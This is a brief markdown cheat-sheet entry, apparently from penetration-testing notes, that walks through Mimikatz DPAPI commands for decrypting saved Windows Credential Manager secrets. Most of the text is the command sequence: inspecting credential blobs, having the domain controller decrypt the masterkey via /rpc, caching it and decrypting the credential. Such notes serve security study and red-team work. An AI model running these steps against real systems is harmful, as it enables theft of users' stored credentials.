- Usually encrypted credentials are stored in:
	1. `%appdata%\Microsoft\Credentials`
	2. `%localappdata%\Microsoft\Credentials`
- By using the `cred` function of Mimikatz we can enumerate the `cred` object and get information about it:
```js
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```
- From the previous command we are interested to the `guidMasterKey` parameter, that tells us which masterkey was used to encrypt the credential.
- Let's enumerate the Master Key:
```js
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"
```
- Now if we are on the context of the user (or system) that the credential belogs to, we can use the `/rpc` flag to pass the decryption of the masterkey to the domain controller:
```js
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc
```
- We now have the masterkey in our local cache:
```js
dpapi::cache
```
- Finally we can decrypt the credential using the cached masterkey:
```js
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```

---

- Detailed article: [DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)
